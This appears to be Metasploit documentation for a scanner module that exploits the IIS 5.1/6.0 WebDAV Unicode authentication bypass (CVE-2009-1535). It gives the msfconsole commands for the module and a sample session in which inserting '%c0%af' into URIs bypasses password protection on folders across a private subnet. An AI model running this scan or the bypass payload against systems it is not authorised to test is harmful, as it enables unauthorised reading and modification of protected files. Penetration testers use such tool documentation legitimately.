## Description

The WebDAV extension in Microsoft Internet Information Services (IIS) 5.1 and 6.0 allows remote attackers to bypass URI-based protection mechanisms, and list folders or read, create, or modify files, via a `%c0%af` (Unicode / character) at an arbitrary position in the URI, as demonstrated by inserting `%c0%af` into a `/protected/` initial pathname component to bypass the password protection on the `protected` folder, aka "IIS 5.1 and 6.0 WebDAV Authentication Bypass Vulnerability," a different vulnerability than CVE-2009-1122. More info about this vulnerability can be found in [CVE-2009-1535](http://cve.mitre.org/cgi-bin/cvename.cgi?name=2009-1535).

## Verification Steps

1. Do: ```use auxiliary/scanner/http/dir_webdav_unicode_bypass```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set THREADS [number of threads]```
4. Do: ```run```

## Scenarios

```
msf > use auxiliary/scanner/http/dir_webdav_unicode_bypass
msf auxiliary(dir_webdav_unicode_bypass) > set RHOSTS 192.168.1.200-254
RHOSTS => 192.168.1.200-254
msf auxiliary(dir_webdav_unicode_bypass) > set THREADS 20
THREADS => 20
msf auxiliary(dir_webdav_unicode_bypass) > run

[*] Using code '404' as not found.
[*] Using code '404' as not found.
[*] Using code '404' as not found.
[*] Found protected folder http://192.168.1.211:80/admin/ 401 (192.168.1.211)
[*] 	Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.
[*] Found protected folder http://192.168.1.223:80/phpmyadmin/ 401 (192.168.1.223)
[*] 	Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.
[*] Found protected folder http://192.168.1.223:80/security/ 401 (192.168.1.223)
[*] 	Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.
[*] Found protected folder http://192.168.1.204:80/printers/ 401 (192.168.1.204)
[*] 	Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.
[*] 	Found vulnerable WebDAV Unicode bypass target http://192.168.1.204:80/%c0%afprinters/ 207 (192.168.1.204)
[*] Found protected folder http://192.168.1.203:80/printers/ 401 (192.168.1.203)
[*] 	Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.
[*] 	Found vulnerable WebDAV Unicode bypass target http://192.168.1.203:80/%c0%afprinters/ 207 (192.168.1.203)
...snip...
[*] Scanned 55 of 55 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(dir_webdav_unicode_bypass) >
```
